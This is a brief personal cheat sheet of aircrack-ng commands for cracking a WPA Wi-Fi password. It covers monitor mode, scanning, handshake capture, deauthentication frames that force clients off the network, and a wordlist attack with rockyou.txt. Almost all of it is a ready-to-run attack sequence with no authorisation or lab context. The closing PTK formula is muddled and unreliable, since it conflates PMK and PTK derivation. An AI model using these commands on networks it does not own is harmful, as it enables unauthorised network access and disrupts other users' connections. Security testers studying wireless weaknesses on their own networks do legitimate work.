1) set the wifi card to monitor mode.
sudo airmon-ng start wlp2s0
iwconfig

2) scan using:
sudo airodump-ng wlp2s0mon
find desired bssid and ch (channel number)

3) capture the handshake when asked to re-authenticate 
sudo airodump-ng -c <channel> --bssid <BSSID> -w ~/capture/capture wlp2s0mon

4) force re-authentication:
sudo aireplay-ng --deauth 5 -a <BSSID> wlp2s0mon

5) multi task it to send the handshake then bruteforce the password from traffic 
aircrack-ng -w rockyou.txt -b <BSSID> capture-01.cap

6) you can ensure the pcap file contains the correct BSSID:

aircrack-ng capture-01.cap

7) we are catching the un-encrypted communication and the Pairwise Transient Key (PTK)

PTK = PBKDF2(PSK, SSID, ANonce, SNonce, MACs)

